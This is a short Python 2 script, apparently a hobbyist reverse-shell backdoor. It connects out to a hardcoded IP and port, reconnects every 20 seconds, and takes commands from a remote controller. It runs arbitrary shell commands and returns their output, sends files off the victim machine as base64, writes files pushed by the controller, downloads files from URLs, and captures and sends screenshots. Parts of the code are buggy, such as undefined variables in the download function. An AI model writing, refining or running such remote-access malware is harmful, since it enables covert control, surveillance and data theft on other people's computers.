#!/usr/bin/python

import socket
import subprocess
import json
import os
import base64
import time
import requests
#fro downloading files from internet
from mss import mss
#for screen shot


def reliable_send(data):
        json_data = json.dumps(data)
        sock.send(json_data)


def reliable_recv():
        data = ""
        while True:
                try:
			data = data + sock.recv(1024)
			return json.loads(data)
                except ValueError:
                        continue

def screenshot():
        with mss() as screenshot:
                screenshot.shot()


def download():
#downloading files to target pc from internet
        get_request = requests.get(url)
        file_name = url.split("/")[-1]
        with open(file_name, "wb") as out_file:
                out_file.write(get_response.content)


def connection():
        while True:
                time.sleep(20)
                try:
                        sock.connect(("192.168.43.147",54321))
                        shell()
                except:
                        connection()




def shell():
	while True:
        	command = reliable_recv()
        	if command == 'q':
                	break
		elif command[:2] == "cd" and len(command) > 1:
			try:
				os.chdir(command[3:])
		#changing of directory
			except:
				continue
        	elif command[:8] == "download":
                        with open(command[9:],"rb") as file:
				reliable_send(base64.b64encode(file.read()))
                elif command[:6] == "upload":
			with open(command[7:], "wb") as fin:
				file_data = reliable_recv()
				fin.write(base64.b64decode(file_data))
		elif command[:3] == "get":
                        try:
                                download(command[4:])
                                reliable_send("[+] Downloaded file from specified url!")
                        except:
                                reliable_send("[-] Failed download that file")
                elif command[:10] == "screenshot":
                        try:
                                screenshot()
                                with open("monitor-1.png","rb")as sc:
                                        reliable_send(base64.b64encode(sc.read()))
                                os.remove("monitor-1.png")
                        except:
                                reliable_send("[!!]Failed to take screenshot")


		else:
                	#message = "HEllo World"
                	#sock.send(message)
			proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			result = proc.stdout.read() + proc.stderr.read()
			reliable_send(result)




sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("192.168.43.147",54321))

connection()
#shell()
sock.close()


